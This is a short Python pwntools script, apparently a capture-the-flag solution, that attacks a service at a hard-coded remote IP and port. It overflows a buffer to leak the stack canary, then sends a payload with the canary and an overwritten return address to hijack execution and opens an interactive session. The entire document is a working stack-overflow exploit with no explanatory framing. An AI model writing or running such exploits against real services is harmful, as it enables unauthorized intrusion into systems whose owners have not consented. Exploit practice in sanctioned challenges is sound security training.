from pwn import *
n = 0x20-8+1
proc = remote("109.233.56.90", 11609)
input()
proc.send(b"A"*n)
proc.recvuntil(b"A"*n)
s = b"\x00"+proc.recvuntil(b"!")[:7]
print(hexdump(s))
proc.send(b"A"*(n - 1) + s + p64(0xdead) +  p64(0x004011a2))
proc.interactive()
